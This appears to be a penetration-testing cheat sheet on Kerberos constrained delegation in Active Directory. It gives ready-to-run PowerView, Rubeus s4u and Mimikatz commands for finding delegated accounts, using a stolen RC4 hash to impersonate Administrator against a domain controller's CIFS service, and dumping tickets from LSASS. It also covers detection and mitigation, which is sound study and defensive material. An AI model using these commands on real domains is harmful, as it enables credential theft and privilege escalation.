# **Constrained Delegation Attack (Kerberos)**

## **Understanding Constrained Delegation**

- **Constrained Delegation** is a Kerberos feature that allows services to impersonate users **only to specified services**.
- Unlike **unconstrained delegation**, constrained delegation limits impersonation to specific targets, reducing attack surfaces.
- However, misconfigurations or overly permissive delegation can allow attackers to escalate privileges and move laterally within the domain.

---

## **How Constrained Delegation Works**

1. **Delegation Basics:**

   - Delegation allows a front-end service (like a web server) to access back-end services (like a database) on behalf of a user.
   - **Constrained Delegation** specifies **which services** the front-end can access, improving security over **unconstrained delegation**.

2. **Vulnerability:**
   - If an attacker compromises a service account with constrained delegation, they can impersonate **any domain user** to the specified services.
   - This can lead to privilege escalation if the back-end services are sensitive (e.g., domain controllers).

---

## **Tools and Techniques**

### **Identify Constrained Delegation (PowerView):**

- Find accounts with constrained delegation:

  ```powershell
  Get-DomainComputer -TrustedToAuthForDelegation
  ```

- Check specific delegation targets:
  ```powershell
  Get-DomainComputer -Identity <server> -Properties msDS-AllowedToDelegateTo
  ```

---

### **Impersonation with Rubeus (S4U2Self & S4U2Proxy):**

- **S4U2Self (Service-for-User-to-Self):**
  - Request a service ticket to impersonate a user.
- **S4U2Proxy (Service-for-User-to-Proxy):**
  - Use the ticket to access another service (allowed by delegation).

---

## **Attack Workflow (Constrained Delegation):**

1. **Identify Constrained Delegation Machines:**

   ```powershell
   Get-DomainComputer -TrustedToAuthForDelegation
   ```

2. **Check Delegation Permissions (Targets):**

   ```powershell
   Get-DomainComputer -Identity <server> -Properties msDS-AllowedToDelegateTo
   ```

3. **Obtain a Service Ticket for User (S4U2Self):**

   ```powershell
   Rubeus.exe s4u /user:<victim> /rc4:<hash> /impersonateuser:<target_user> /domain:<domain>
   ```

4. **Request Access to Target Service (S4U2Proxy):**
   ```powershell
   Rubeus.exe s4u /ticket:<ticket> /target:<service>/<target>
   ```

---

### **Mimikatz (Perform Constrained Delegation):**

- **Extract Ticket from LSASS:**

  ```powershell
  sekurlsa::tickets /export
  ```

- **Inject Ticket to Impersonate User:**
  ```powershell
  kerberos::ptt <ticket.kirbi>
  ```

---

## **Example Attack Workflow (Constrained Delegation):**

1. **Identify Targets with Constrained Delegation:**

   ```powershell
   Get-DomainComputer -TrustedToAuthForDelegation
   ```

2. **Identify Delegation Targets:**

   ```powershell
   Get-DomainComputer -Identity <target_machine> -Properties msDS-AllowedToDelegateTo
   ```

3. **Impersonate a User (Rubeus S4U2Self):**

   ```powershell
   Rubeus.exe s4u /user:<service_account> /rc4:<hash> /impersonateuser:Administrator /domain:<domain>
   ```

4. **Access Back-End Services (Rubeus S4U2Proxy):**
   ```powershell
   Rubeus.exe s4u /ticket:<tgt.kirbi> /target:cifs/dc01.domain.local
   ```

---

## **Detection and Mitigation**

### **Mitigation Techniques:**

1. **Limit Constrained Delegation:**

   - Apply **resource-based constrained delegation (RBCD)** instead of traditional constrained delegation.
   - Limit services and users that can be impersonated.

2. **Protect Sensitive Accounts:**

   - Ensure domain admins and critical service accounts are not subject to delegation.

3. **Restrict Privileged Users:**
   ```powershell
   Set-ADUser -Identity <user> -AccountNotDelegated $True
   ```

---

### **Detection Techniques:**

- **Monitor Event Logs:**
  - **Event ID 4769** – Kerberos TGS requests.
  - Look for constrained delegation activity by analyzing **TGS-REQ patterns**.
- **Analyze Delegation Permissions:**
  ```powershell
  Get-DomainComputer -TrustedToAuthForDelegation
  ```

---

## **Testing for Constrained Delegation**

- **Enumerate Delegated Accounts:**

  ```powershell
  Get-DomainComputer -Filter {TrustedToAuthForDelegation -eq $True}
  ```

- **Check Delegation Scope:**
  ```powershell
  Get-DomainComputer -Identity <service> -Properties msDS-AllowedToDelegateTo
  ```

---

## **Real-World Impact:**

- **Privilege Escalation:**
  - Compromising an account with constrained delegation can lead to **domain admin impersonation** if misconfigured.
- **Persistence:**
  - Attackers can continuously impersonate users by retaining delegation rights.
- **Lateral Movement:**
  - Pivot across the network by accessing sensitive services through constrained delegation.

---

## **Example Scenario (Full):**

1. **Identify Constrained Delegation Machines:**

   ```powershell
   Get-DomainComputer -TrustedToAuthForDelegation
   ```

2. **Identify Delegated Services:**

   ```powershell
   Get-DomainComputer -Identity webserver01 -Properties msDS-AllowedToDelegateTo
   ```

3. **Impersonate Domain Admin (S4U2Self & S4U2Proxy):**

   ```powershell
   Rubeus.exe s4u /user:webserver01$ /rc4:<hash> /impersonateuser:Administrator /domain:domain.local
   ```

4. **Access Domain Controller Services:**
   ```powershell
   Rubeus.exe s4u /ticket:<tgt.kirbi> /target:cifs/dc01.domain.local
   ```

---

## **⚠️Disclaimer⚠️**

This guide is for **educational purposes only**. Unauthorized exploitation of constrained delegation is illegal and unethical. Always conduct penetration tests with proper authorization.
